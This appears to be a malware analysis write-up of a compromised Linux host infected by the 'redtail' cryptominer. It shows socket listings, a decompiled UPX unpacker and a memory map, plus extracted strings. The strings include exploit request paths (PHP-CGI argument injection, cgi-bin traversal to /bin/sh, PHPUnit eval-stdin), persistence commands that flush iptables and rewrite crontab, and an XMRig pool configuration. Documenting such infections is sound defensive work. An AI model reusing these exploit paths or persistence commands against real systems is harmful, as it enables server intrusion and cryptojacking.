unix  3      [ ]         STREAM     CONNECTED     5496384  
unix  3      [ ]         STREAM     CONNECTED     15158    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     454992   /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM      CONNECTED     15003    
unix  3      [ ]         STREAM     CONNECTED     17103    
unix  3      [ ]         STREAM     CONNECTED     453275   
unix  3      [ ]         STREAM     CONNECTED     18629    
unix  2      [ ]         DGRAM      CONNECTED     14998    
unix  3      [ ]         STREAM     CONNECTED     16828    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     5496383  
unix  2      [ ]         DGRAM      CONNECTED     15350    
unix  2      [ ]         STREAM     CONNECTED     5496571  
unix  3      [ ]         DGRAM      CONNECTED     14560    
unix  3      [ ]         STREAM     CONNECTED     5534284  
unix  3      [ ]         STREAM     CONNECTED     16799    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18700    
unix  2      [ ]         DGRAM      CONNECTED     20482    
unix  3      [ ]         STREAM     CONNECTED     16698    
unix  3      [ ]         STREAM     CONNECTED     451486   /run/systemd/journal/stdout
unix  3      [ ]         DGRAM      CONNECTED     14559    
unix  3      [ ]         STREAM     CONNECTED     18628    
unix  3      [ ]         STREAM     CONNECTED     5496479  
unix  3      [ ]         STREAM     CONNECTED     16825    
unix  3      [ ]         STREAM     CONNECTED     15160    /run/dbus/system_bus_socket
unix  2      [ ]         STREAM     CONNECTED     5496494  
unix  3      [ ]         STREAM     CONNECTED     16801    
unix  3      [ ]         STREAM     CONNECTED     5534283  
unix  3      [ ]         STREAM     CONNECTED     18627    
unix  3      [ ]         DGRAM      CONNECTED     15002    
unix  3      [ ]         STREAM     CONNECTED     16697    
Active Bluetooth connections (w/o servers)
Proto  Destination       Source            State         PSM DCID   SCID      IMTU    OMTU Security
Proto  Destination       Source            State     Channel
[cloud@edge-1 ~]$ 
```

# Established Connection
```
[cloud@edge-1 ~]$ ss 
Netid                                           State                                           Recv-Q                                           Send-Q                                                                                                      Local Address:Port                                                                                           Peer Address:Port                                              
u_dgr                                           ESTAB                                           0                                                0                                                                                                /run/chrony/chronyd.sock 18663                                                                                                     * 0                                                 
u_dgr                                           ESTAB                                           0                                                0                                                                                                     /run/systemd/notify 14558                                                                                                     * 0                                                 
u_dgr                                           ESTAB                                           251                                              0                                                                                            /run/systemd/journal/dev-log 14571                                                                                                     * 0                                                 
u_dgr                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/socket 14573                                                                                                     * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 16831                                                                                                     * 15173                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 17994                                                                                                     * 14573                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5540884                                                                                                   * 5540885                                           
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 15032                                                                                                     * 17940                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15173                                                                                                     * 16831                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5496623                                                                                                   * 14571                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 16696                                                                                                     * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 16843                                                                                                     * 15205                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 20080                                                                                                     * 18676                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 453306                                                                                                    * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 18686                                                                                                     * 20086                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 453321                                                                                                    * 453320                                            
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5498544                                                                                                   * 5498543                                           
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5498504                                                                                                   * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 15157                                                                                                     * 18047                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 17857                                                                                                     * 14573                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 15258                                                                                                     * 15257                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5499507                                                                                                   * 5499508                                           
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 22573                                                                                                     * 21829                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 15354                                                                                                     * 15351                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 453320                                                                                                    * 453321                                            
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5496556                                                                                                   * 14571                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 18625                                                                                                     * 14573                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5499508                                                                                                   * 5499507                                           
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 453314                                                                                                    * 14573                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5498435                                                                                                   * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5499558                                                                                                   * 5499559                                           
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5498384                                                                                                   * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 21829                                                                                                     * 22573                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15257                                                                                                     * 15258                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5498543                                                                                                   * 5498544                                           
u_dgr                                           ESTAB                                           0                                                20480                                                                                                                   * 21858                                                                                                     * 14571                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5535701                                                                                                   * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 20086                                                                                                     * 18686                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5540885                                                                                                   * 5540884                                           
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 13591                                                                                                     * 15041                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 17940                                                                                                     * 15032                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15168                                                                                                     * 16820                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 18644                                                                                                     * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18047                                                                                                     * 15157                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 5496473                                                                                                   * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5499559                                                                                                   * 5499558                                           
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 13517                                                                                                     * 14558                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15351                                                                                                     * 15354                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 18676                                                                                                     * 20080                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5535654                                                                                                   * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15205                                                                                                     * 16843                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 16954                                                                                                     * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 16820                                                                                                     * 15168                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 15041                                                                                                     * 13591                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5498453                                                                                                   * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 14989                                                                                                     * 16666                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 15266                                                                                                     * 18700                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 16666                                                                                                     * 14989                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496478                                                                                                   * 5496479                                           
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 15194                                                                                                     * 14573                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18619                                                                                                     * 16799                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 453324                                                                                                    * 454992                                            
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496421                                                                                                   * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 17106                                                                                                     * 17103                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496384                                                                                                   * 5496383                                           
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 15158                                                                                                     * 16801                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 454992                                                                                                    * 453324                                            
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 15003                                                                                                     * 15002                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 17103                                                                                                     * 17106                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 453275                                                                                                    * 451486                                            
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18629                                                                                                     * 15160                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 14998                                                                                                     * 14573                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 16828                                                                                                     * 16825                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496383                                                                                                   * 5496384                                           
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 15350                                                                                                     * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496571                                                                                                   * 0                                                 
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 14560                                                                                                     * 14559                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5534284                                                                                                   * 5534283                                           
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 16799                                                                                                     * 18619                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18700                                                                                                     * 15266                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 20482                                                                                                     * 14571                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 16698                                                                                                     * 16697                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/systemd/journal/stdout 451486                                                                                                    * 453275                                            
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 14559                                                                                                     * 14560                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18628                                                                                                     * 18627                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496479                                                                                                   * 5496478                                           
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 16825                                                                                                     * 16828                                             
u_str                                           ESTAB                                           0                                                0                                                                                             /run/dbus/system_bus_socket 15160                                                                                                     * 18629                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5496494                                                                                                   * 0                                                 
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 16801                                                                                                     * 15158                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 5534283                                                                                                   * 5534284                                           
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 18627                                                                                                     * 18628                                             
u_dgr                                           ESTAB                                           0                                                0                                                                                                                       * 15002                                                                                                     * 15003                                             
u_str                                           ESTAB                                           0                                                0                                                                                                                       * 16697                                                                                                     * 16698                                             
udp                                             ESTAB                                           0                                                0                                                                                                         10.254.1.6%ens3:bootpc                                                                                           10.254.1.2:bootps                                            
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:44364                                                                                         130.12.180.51:43782                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:41190                                                                                          51.138.20.48:https                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:45738                                                                                         45.148.10.144:21370                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:ssh                                                                                            91.142.77.37:13350                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:ssh                                                                                            91.142.77.37:33700                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:49840                                                                                          108.138.7.95:https                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:ssh                                                                                           10.159.17.245:34666                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:ssh                                                                                            91.142.77.37:33716                                             
tcp                                             ESTAB                                           0                                                3256                                                                                                           10.254.1.6:ssh                                                                                            91.142.77.37:13336                                             
tcp                                             ESTAB                                           0                                                23904                                                                                                          10.254.1.6:ssh                                                                                            91.142.77.37:13330                                             
tcp                                             ESTAB                                           0                                                0                                                                                                              10.254.1.6:ssh                                                                                            2.57.122.190:41142                                             
[cloud@edge-1 ~]$
```

# Payloader compressor / enc / dec algorithm
# long local_1700 [727]; <-----this variable is the depote of compressed / enc code ---->

```
void processEntry entry(undefined8 param_1)

{
  ulong *puVar1;
  uint uVar2;
  uint uVar3;
  undefined8 uVar4;
  int iVar5;
  uint uVar6;
  undefined8 uVar7;
  int extraout_EDX;
  ulong uVar8;
  code *pcVar9;
  code *extraout_RDX;
  code *extraout_RDX_00;
  code *extraout_RDX_01;
  code *extraout_RDX_02;
  code *extraout_RDX_03;
  code *extraout_RDX_04;
  long lVar10;
  long *plVar11;
  undefined1 *puVar12;
  undefined1 *puVar13;
  long *plVar14;
  bool bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  undefined1 auVar19 [16];
  long local_1700 [727];
  undefined8 uStack_48;
  undefined *puStack_38;
  undefined8 uStack_30;
  undefined *puStack_28;
  undefined8 local_20;
  long local_18;
  undefined8 uStack_10;
  long local_8;
  
  plVar11 = (long *)&stack0x00000008;
  do {
    lVar10 = *plVar11;
    plVar14 = plVar11 + 1;
    plVar11 = plVar11 + 1;
  } while (lVar10 != 0);
  do {
    plVar11 = plVar14 + 1;
    lVar10 = *plVar14;
    plVar14 = plVar11;
  } while (lVar10 != 0);
  uVar8 = 0x1000;
  do {
    puVar1 = (ulong *)(plVar11 + 1);
    lVar10 = *plVar11;
    if ((int)lVar10 == 0) goto LAB_00aa9e40;
    plVar11 = plVar11 + 2;
  } while ((int)lVar10 != 6);
  uVar8 = *puVar1 & 0xffffffff;
LAB_00aa9e40:
  local_8 = -uVar8;
  syscall();
  uVar4 = 0x13f;
  puStack_28 = &DAT_008e0000;
  local_18 = 0x168b;
  local_20 = 0xffffffffffffffff;
  uStack_30 = 0x1c9cac;
  puStack_38 = &DAT_008e0168;
  uVar7 = 0;
  pcVar9 = FUN_00aa9f97;
  lVar10 = -1;
  bVar18 = 0;
  bVar15 = false;
  puVar12 = &DAT_00aa9fbc;
  plVar11 = local_1700;
  uStack_10 = param_1;
  do {
    while ((*pcVar9)(), bVar15) {
      *(undefined1 *)plVar11 = *puVar12;
      bVar15 = true;
      pcVar9 = extraout_RDX;
      puVar12 = puVar12 + (ulong)bVar18 * -2 + 1;
      plVar11 = (long *)((long)plVar11 + (ulong)bVar18 * -2 + 1);
    }
    bVar16 = 0;
    pcVar9 = extraout_RDX;
    do {
      uVar3 = (*pcVar9)();
      bVar16 = CARRY4(uVar3,uVar3) || CARRY4(uVar3 * 2,(uint)bVar16);
      uVar3 = (*extraout_RDX_00)();
      uVar6 = (uint)uVar7;
      pcVar9 = extraout_RDX_01;
    } while (!(bool)bVar16);
    bVar16 = uVar3 < 3;
    puVar13 = puVar12;
    if (!(bool)bVar16) {
      puVar13 = puVar12 + (ulong)bVar18 * -2 + 1;
      bVar16 = false;
      uVar3 = CONCAT31((int3)uVar3 + -3,*puVar12) ^ 0xffffffff;
      if (uVar3 == 0) {
        if (puVar13 != &UNK_00aaae52) {
          do {
                    /* WARNING: Do nothing block with infinite loop */
          } while( true );
        }
        local_1700[0] = local_8;
        lVar10 = local_18 + -0x10;
        do {
          iVar5 = FUN_00aa9f78();
        } while (extraout_EDX != iVar5);
        lVar10 = FUN_00aa9f78(0,lVar10,5);
        uStack_48 = 3;
        syscall();
                    /* WARNING: Could not recover jumptable at 0x00aa9f76. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        (*(code *)(lVar10 + 8))(uVar4);
        return;
      }
      lVar10 = (long)(int)uVar3;
    }
    (*extraout_RDX_01)();
    bVar17 = CARRY4(uVar6,uVar6) || CARRY4(uVar6 * 2,(uint)bVar16);
    iVar5 = uVar6 * 2 + (uint)bVar16;
    auVar19 = (*extraout_RDX_02)();
    pcVar9 = auVar19._8_8_;
    uVar3 = auVar19._0_4_;
    uVar6 = iVar5 * 2 + (uint)bVar17;
    if (uVar6 == 0) {
      uVar8 = auVar19._0_8_ & 0xffffffff;
      bVar16 = 0xfffffffd < uVar3;
      do {
        uVar6 = (uint)uVar8;
        (*pcVar9)();
        uVar3 = (uint)bVar16;
        bVar16 = CARRY4(uVar6,uVar6) || CARRY4(uVar6 * 2,uVar3);
        uVar8 = (ulong)(uVar6 * 2 + uVar3);
        uVar3 = (*extraout_RDX_03)();
        uVar6 = (uint)uVar8;
        pcVar9 = extraout_RDX_04;
      } while (!(bool)bVar16);
    }
    uVar2 = (uint)((uint)lVar10 < 0xfffff300);
    bVar15 = CARRY4(uVar6,uVar3) || CARRY4(uVar6 + uVar3,uVar2);
    puVar12 = (undefined1 *)((long)plVar11 + lVar10);
    for (uVar8 = (ulong)(uVar6 + uVar3 + uVar2); uVar8 != 0; uVar8 = uVar8 - 1) {
      *(undefined1 *)plVar11 = *puVar12;
      puVar12 = puVar12 + (ulong)bVar18 * -2 + 1;
      plVar11 = (long *)((long)plVar11 + (ulong)bVar18 * -2 + 1);
    }
    uVar7 = 0;
    puVar12 = puVar13;
  } while( true );
}
```
# This is After checking out the memory the real Functions after decrypting.
```
[cloud@edge-1 ~]$ cat /proc/162546/maps
00400000-008c6000 r-xs 00000000 00:01 31                                 /memfd:upx (deleted)
008c6000-008e0000 rw-p 00000000 00:00 0 
01a9e000-01a9f000 ---p 00000000 00:00 0                                  [heap]
01a9f000-01aa1000 rw-p 00000000 00:00 0                                  [heap]
01aa1000-01aa2000 rw-p 00000000 00:00 0                                  [heap]
7f33d9300000-7f33d9320000 rwxp 00000000 00:00 0 
7f33d9320000-7f33d9521000 rw-p 00000000 00:00 0 
7f33d9521000-7f33d9541000 rwxp 00000000 00:00 0 
7f33d9541000-7f33d9742000 rw-p 00000000 00:00 0 
7f33d9742000-7f33d9762000 rwxp 00000000 00:00 0 
7f33d9762000-7f33d9963000 rw-p 00000000 00:00 0 
7f33d9963000-7f33d9983000 rwxp 00000000 00:00 0 
7f33d9983000-7f33d9d86000 rw-p 00000000 00:00 0 
7f33d9d86000-7f33d9d88000 ---p 00000000 00:00 0 
7f33d9d88000-7f33d9dab000 rw-p 00000000 00:00 0 
7f33d9dab000-7f33d9dad000 ---p 00000000 00:00 0 
7f33d9dad000-7f346bed3000 rw-p 00000000 00:00 0 
7f346bed4000-7f346bee5000 rw-p 00000000 00:00 0 
7f346bee5000-7f346bee7000 ---p 00000000 00:00 0 
7f346bee7000-7f346bf0a000 rw-p 00000000 00:00 0 
7f346bf0a000-7f346bf0c000 ---p 00000000 00:00 0 
7f346bf0c000-7f346bf80000 rw-p 00000000 00:00 0 
7f346bf80000-7f346bfa0000 rwxp 00000000 00:00 0 
7f346bfa0000-7f346bffa000 rw-p 00000000 00:00 0 
7f346bffc000-7f346c006000 rw-p 00000000 00:00 0 
7f346c008000-7f346c00a000 rw-p 00000000 00:00 0 
7f346c017000-7f346c01f000 rw-p 00000000 00:00 0 
7f346c01f000-7f346c021000 ---p 00000000 00:00 0 
7f346c021000-7f346c04f000 rw-p 00000000 00:00 0 
7f346c050000-7f346c075000 rw-p 00000000 00:00 0 
7f346c075000-7f346c078000 rw-p 00000000 00:00 0 
7f346c078000-7f346c079000 rw-p 00000000 00:00 0 
7f346c079000-7f346c07b000 ---p 00000000 00:00 0 
7f346c07b000-7f346c09e000 rw-p 00000000 00:00 0 
7f346c09e000-7f346c0a0000 ---p 00000000 00:00 0 
7f346c0a0000-7f346c5fd000 rw-p 00000000 00:00 0 
7f346c5fd000-7f346c61a000 rw-p 00000000 00:00 0 
7f346c61a000-7f346c63a000 r-xp 00000000 00:00 0 
7f346c63a000-7f346c646000 rw-p 00000000 00:00 0 
7f346c646000-7f346c647000 r--p 00000000 fd:01 536                        /tmp/.PnWsXHTYQ5amAUq
7f346c647000-7f346c649000 rw-p 00000000 00:00 0 
7fff8b074000-7fff8b0a8000 rw-p 00000000 00:00 0                          [stack]
7fff8b16e000-7fff8b172000 r--p 00000000 00:00 0                          [vvar]
7fff8b172000-7fff8b174000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
[cloud@edge-1 ~]$ 
```

# The cenario is PHP eval execution for backdoor
# With cron keep it up all times 
# Hash pool connection list
```
/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php
/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/LICENSE/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
redtail
redtail
iptables -F >/dev/null 2>&1; iptables -I INPUT -p tcp --dport {} -j ACCEPT >/dev/null 2>&1
" | crontab -
crontab -r >/dev/null 2>&1; echo "@reboot 
crontab
/etc/systemd/system/your-redtail.service
    "autosave": true,
    "opencl": false,
    "cuda": false,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": 95
    },
    "randomx": {
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": false,
        "wrmsr": true
    },
    "pools": [
        {
            "nicehash": true,
            "url": "proxies.internetshadow.org:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.internetshadow.link:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.identities.network:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanitycpp.cx:2137"
        },
        {
            "nicehash": true,
            "url": "proxies.insanecppdev.com:2137"
        }
    ]
```

The whole constant variable which is being used in the code
```
COLORFGBG=15;0
QT_WAYLAND_RECONNECT=1
KDE_SESSION_VERSION=6
LESS_TERMCAP_ue=
LESS_TERMCAP_us=
[1;32m
QT_IM_MODULE=ibus
XDG_SESSION_ID=2
MANAGERPIDFDID=1521
JOURNAL_STREAM=9:21939
KDE_FULL_SESSION=true
GDMSESSION=plasmax11
KDE_APPLICATIONS_AS_SCOPE=1
OLDPWD=/home/fire
_=./PnWsXHTYQ5amAUq
proxies.internetshadow.link
proxies.identities.network
proxies.insanitycpp.cx:2137
proxies.insanitycpp.cx
proxies.insanecppdev.com
v.com
p.2137gang.store
proxy.internetshadow.org
proxy.internetshadow.link
proxy.identities.network
proxy.insanitycpp.cx
proxy.insanecppdev.com
/usr/sbin/apache2 -k start
proxies.internetshadow.org
                                U
                                5
/proc/self/exe
--type=ut`
utility-sub-type=network.moj
GTK_RC_FILES=/etc/gtk/gtkrc:/home/fire/.gtkrc:/home/fire/.config/gtkrc
KONSOLE_DBUS_ACTIVATION_COOKIE=KsWV+xPPRlhMsC90t1s3rQRu+hiKcJs08kogxmCKWx0=
XDG_DATA_DIRS=/usr/share/gnome:/usr/local/share/:/usr/share/
type
type
/usr/lib/firefox-esr/fir
-contentproc
-isForBrowser
/usr/share/code/chrome_c
handler
--monitor-self-annot
/usr/share/code/code
--t 
--no-zygote-sandbox
ech-
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.jxl=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/session.slice/plasma-plasmashell.service/memory.pressure
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/session.slice/plasma-plasmashell.service/memory.pressure
LESS_TERMCAP_mb=
[1;31m
LESS_TERMCAP_me=
LESS_TERMCAP_md=
[1;36m
QT_WAYLAND_RECONNECT=1
KDE_SESSION_VERSION=6
LESS_TERMCAP_ue=
LESS_TERMCAP_us=
[1;32m
QT_IM_MODULE=ibus
XDG_SESSION_ID=2
MANAGERPIDFDID=1521
JOURNAL_STREAM=9:21939
KDE_FULL_SESSION=true
GDMSESSION=plasmax11
